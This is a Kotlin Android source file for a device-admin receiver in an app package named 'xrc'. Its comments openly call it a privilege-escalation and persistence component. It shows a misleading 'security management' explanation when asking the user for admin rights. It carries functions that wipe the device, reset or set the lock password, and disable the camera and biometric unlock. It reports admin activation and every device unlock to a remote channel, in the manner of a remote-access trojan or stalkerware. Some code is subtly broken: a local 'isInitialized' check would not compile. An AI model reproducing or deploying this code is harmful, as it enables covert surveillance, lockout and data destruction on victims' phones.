// ============================================================
// FILE: android/app/src/main/java/com/xrc/xrc/XrcDeviceAdminReceiver.kt
// ============================================================
package com.xrc.xrc

import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.xrc.XrcApplication

/**
 * XrcDeviceAdminReceiver — Device Admin capabilities.
 *
 * Provides:
 * - Lock screen
 * - Wipe device (factory reset)
 * - Set/reset password
 * - Disable camera
 * - Freeze/unfreeze device
 * - Disable keyguard features
 * - Password expiration policies
 *
 * This is a critical privilege escalation component.
 */
class XrcDeviceAdminReceiver : DeviceAdminReceiver() {
    companion object {
        private const val TAG = "DeviceAdminReceiver"

        /**
         * Get ComponentName for this receiver.
         */
        fun getComponentName(context: Context): ComponentName {
            return ComponentName(context, XrcDeviceAdminReceiver::class.java)
        }
    }

    private fun getDpm(context: Context): DevicePolicyManager {
        return context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
    }

    /**
     * Check if admin is active.
     */
    fun isAdminActive(context: Context): Boolean {
        return getDpm(context).isAdminActive(getComponentName(context))
    }

    /**
     * Activate Device Admin (opens system settings page).
     */
    fun activateAdmin(context: Context) {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, getComponentName(context))
            putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required for device security management"
            )
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }

    /**
     * Deactivate Device Admin (requires user confirmation).
     */
    fun deactivateAdmin(context: Context) {
        getDpm(context).removeActiveAdmin(getComponentName(context))
    }

    /**
     * Lock screen immediately.
     */
    fun lockScreen(context: Context) {
        getDpm(context).lockNow()
    }

    /**
     * Wipe device (factory reset).
     * WARNING: This is destructive and irreversible.
     */
    fun wipeDevice(context: Context) {
        getDpm(context).wipeData(0)
    }

    /**
     * Wipe device with a wipe message.
     */
    fun wipeDeviceWithFlags(context: Context, flags: Int = DevicePolicyManager.WIPE_RESET_PROTECTION_DATA) {
        getDpm(context).wipeData(flags)
    }

    /**
     * Disable or enable camera.
     */
    fun setCameraDisabled(context: Context, disabled: Boolean) {
        getDpm(context).setCameraDisabled(getComponentName(context), disabled)
    }

    /**
     * Set a new device password.
     */
    fun setPassword(context: Context, password: String): Boolean {
        return getDpm(context).isActivePasswordSufficient ||
                getDpm(context).resetPassword(password, 0)
    }

    /**
     * Reset password to empty.
     */
    fun resetPassword(context: Context) {
        getDpm(context).resetPassword("", 0)
    }

    /**
     * Set password quality requirements.
     */
    fun setPasswordQuality(context: Context, quality: Int) {
        getDpm(context).setPasswordQuality(getComponentName(context), quality)
    }

    /**
     * Set maximum failed password attempts before wipe.
     */
    fun setMaximumFailedPasswordsForWipe(context: Context, max: Int) {
        getDpm(context).setMaximumFailedPasswordsForWipe(getComponentName(context), max)
    }

    /**
     * Disable keyguard features.
     */
    fun disableKeyguardFeatures(context: Context) {
        val flags = DevicePolicyManager.KEYGUARD_DISABLE_SECURE_CAMERA or
                DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT or
                DevicePolicyManager.KEYGUARD_DISABLE_FACE or
                DevicePolicyManager.KEYGUARD_DISABLE_IRIS
        getDpm(context).setKeyguardDisabledFeatures(getComponentName(context), flags)
    }

    /**
     * Freeze device by locking immediately and disabling camera.
     */
    fun freezeDevice(context: Context) {
        setCameraDisabled(context, true)
        lockScreen(context)
    }

    /**
     * Set lock screen password (forces user to change).
     */
    fun setLockScreenPassword(context: Context, password: String) {
        setPassword(context, password)
        setPasswordQuality(context, DevicePolicyManager.PASSWORD_QUALITY_NUMERIC)
    }

    /**
     * Get active admin policies.
     */
    fun getActivePolicies(context: Context): Map<String, Any> {
        val dpm = getDpm(context)
        return mapOf(
            "is_active" to isAdminActive(context),
            "camera_disabled" to dpm.getCameraDisabled(getComponentName(context)),
            "password_quality" to dpm.getPasswordQuality(getComponentName(context)),
            "max_failed_wipe" to dpm.getMaximumFailedPasswordsForWipe(getComponentName(context)),
            "storage_encrypted" to dpm.getStorageEncryptionStatus()
        )
    }

    // ---- DeviceAdminReceiver callbacks ----

    override fun onEnabled(context: Context, intent: Intent) {
        Log.i(TAG, "Device admin enabled")
        val app = XrcApplication.instance
        if (::app.isInitialized) {
            val deviceId = com.xrc.core.crypto.Identity.getDeviceId(context)
            val msg = com.xrc.comms.Message(
                type = com.xrc.comms.Protocol.TYPE_SENSOR_DATA,
                id = "admin_enabled_${System.currentTimeMillis()}",
                device_id = deviceId,
                payload = "{\"event\":\"admin_enabled\"}"
            )
            app.serviceLocator.channelClient.send(msg)
        }
    }

    override fun onDisabled(context: Context, intent: Intent) {
        Log.w(TAG, "Device admin disabled")
        // Try to re-enable if persistence requires it
    }

    override fun onPasswordChanged(context: Context, intent: Intent) {
        Log.i(TAG, "Device password changed")
    }

    override fun onPasswordFailed(context: Context, intent: Intent) {
        Log.w(TAG, "Device password failed")
    }

    override fun onPasswordSucceeded(context: Context, intent: Intent) {
        Log.d(TAG, "Device password succeeded")
        val app = XrcApplication.instance
        if (::app.isInitialized) {
            val deviceId = com.xrc.core.crypto.Identity.getDeviceId(context)
            val msg = com.xrc.comms.Message(
                type = com.xrc.comms.Protocol.TYPE_SENSOR_DATA,
                id = "unlock_${System.currentTimeMillis()}",
                device_id = deviceId,
                payload = "{\"event\":\"device_unlocked\"}"
            )
            app.serviceLocator.channelClient.send(msg)
        }
    }

    override fun onLockTaskModeEntering(context: Context, intent: Intent, pin: String) {
        Log.i(TAG, "Lock task mode entered")
    }

    override fun onLockTaskModeExiting(context: Context, intent: Intent) {
        Log.i(TAG, "Lock task mode exited")
    }
}
